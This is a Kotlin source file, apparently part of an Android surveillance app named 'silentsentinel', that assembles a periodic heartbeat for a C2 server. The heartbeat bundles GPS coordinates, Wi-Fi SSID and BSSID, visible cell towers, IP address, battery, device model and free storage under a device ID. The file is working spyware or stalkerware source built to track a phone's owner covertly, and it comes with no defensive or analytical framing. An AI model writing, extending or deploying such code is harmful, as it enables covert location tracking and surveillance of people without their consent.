package com.silentsentinel

import android.content.Context
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Environment
import android.telephony.TelephonyManager
import org.json.JSONObject
import java.io.File

/**
 * Assembles a comprehensive device profile snapshot for the
 * periodic heartbeat to the C2 server. This gives you
 * network position, cell topology, and device state
 * alongside the GPS coordinates.
 */
object DeviceProfile {

    data class DeviceSnapshot(
        val gpsLat: Double,
        val gpsLng: Double,
        val gpsAccuracy: Float,
        val gpsProvider: String,
        val batteryPct: Int,
        val wifiSsid: String,
        val wifiBssid: String,
        val wifiRssi: Int,
        val cellTowers: List<CellTowerScanner.CellTowerInfo>,
        val ipAddress: String,
        val isCharging: Boolean,
        val storageFreeMb: Long,
        val deviceModel: String,
        val osVersion: String
    )

    fun buildHeartbeat(
        context: Context,
        lat: Double,
        lng: Double,
        accuracy: Float,
        provider: String,
        batteryLevel: Int,
        isCharging: Boolean
    ): JSONObject {

        val wifi = WifiScanner.getConnectedWifi(context)
        val towers = CellTowerScanner.getVisibleTowers(context)
        val ip = getLocalIpAddress()

        val json = JSONObject()

        // GPS core
        json.put("device_id", C2Client.DEVICE_ID)
        json.put("lat", lat)
        json.put("lng", lng)
        json.put("accuracy", accuracy.toDouble())
        json.put("provider", provider)
        json.put("timestamp", System.currentTimeMillis())

        // Power
        json.put("battery", batteryLevel)
        json.put("charging", isCharging)

        // WiFi fingerprint
        if (wifi != null) {
            json.put("wifi_ssid", wifi.ssid)
            json.put("wifi_bssid", wifi.bssid)
            json.put("wifi_rssi", wifi.rssi)
        } else {
            json.put("wifi_ssid", JSONObject.NULL)
            json.put("wifi_bssid", JSONObject.NULL)
            json.put("wifi_rssi", -1)
        }

        // Cell towers
        val towersArr = org.json.JSONArray()
        for (t in towers) {
            val tJson = JSONObject().apply {
                put("mcc", t.mcc)
                put("mnc", t.mnc)
                put("tac", t.tac ?: JSONObject.NULL)
                put("ci", t.ci ?: JSONObject.NULL)
                put("tech", t.technology)
            }
            towersArr.put(tJson)
        }
        json.put("cell_towers", towersArr)

        // IP
        json.put("ip", ip ?: JSONObject.NULL)

        // Device info
        json.put("model", Build.MODEL)
        json.put("os", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")

        // Storage
        json.put("storage_free_mb", getFreeStorageMb())

        return json
    }

    private fun getLocalIpAddress(): String? {
        return try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            while (interfaces.hasMoreElements()) {
                val intf = interfaces.nextElement()
                val addrs = intf.inetAddresses
                while (addrs.hasMoreElements()) {
                    val addr = addrs.nextElement()
                    if (!addr.isLoopbackAddress && addr is java.net.Inet4Address) {
                        return addr.hostAddress
                    }
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }

    private fun getFreeStorageMb(): Long {
        return try {
            val stat = Environment.getDataDirectory().let { dir ->
                android.os.StatFs(dir.path)
            }
            val bytes = stat.availableBlocksLong * stat.blockSizeLong
            bytes / (1024 * 1024)
        } catch (e: Exception) {
            -1L
        }
    }
}